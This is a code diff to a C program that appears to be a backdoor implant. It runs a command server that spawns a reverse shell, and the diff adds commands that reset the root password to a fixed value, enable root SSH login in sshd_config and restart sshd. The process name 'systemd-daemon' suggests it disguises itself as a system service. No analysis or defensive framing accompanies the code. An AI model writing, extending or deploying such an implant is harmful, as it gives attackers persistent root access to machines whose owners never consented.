@@ -12,7 +12,7 @@
 
 #define SA struct sockaddr
 
-void spawn_shell() {
+void spawn_shell(void) {
     char input[BUFFER_SIZE];
     char revshell[BUFFER_SIZE];
     char *revshell1 = "/9001 0>&1'";
@@ -30,8 +30,12 @@ void spawn_shell() {
     system(revshell);
 }
 
+void enable_root_ssh(void) {
+    system("bash -c \"echo -e 'PermitRootLogin yes' >> /etc/ssh/sshd_config\"");
+    system("service sshd restart");
+}
 
-void read_data() { 
+void read_data(void) { 
     char input[BUFFER_SIZE];
 
     for (;;) { 
@@ -40,7 +44,6 @@ void read_data() {
         write(connfd, "\0", 1);
         if (handler(input) == 1)
             raise(SIGINT);
-        
     }
 }
 
@@ -50,13 +53,18 @@ int handler(char option[BUFFER_SIZE]) {
     } else if (strncmp(option,"shell\n",6) == 0) {
         if (fork()== 0)
             spawn_shell();
-    } else if (strncmp(option,"kill\n",5) == 0)
+    } else if (strncmp(option,"kill\n",5) == 0) {
         system("pkill -9 systemd-daemon");
+    } else if (strncmp(option,"passwd\n",7) == 0) {
+        system(" bash -c \"echo -e 'systemd-kit\nsystemd-kit\n' | passwd\"");
+    } else if (strncmp(option,"ssh\n",4) == 0) {
+        enable_root_ssh();
+    }
 
     return 0;
 }
 
-void start_server() {
+void start_server(void) {
     int sockfd;
     unsigned int len; 
     struct sockaddr_in servaddr;
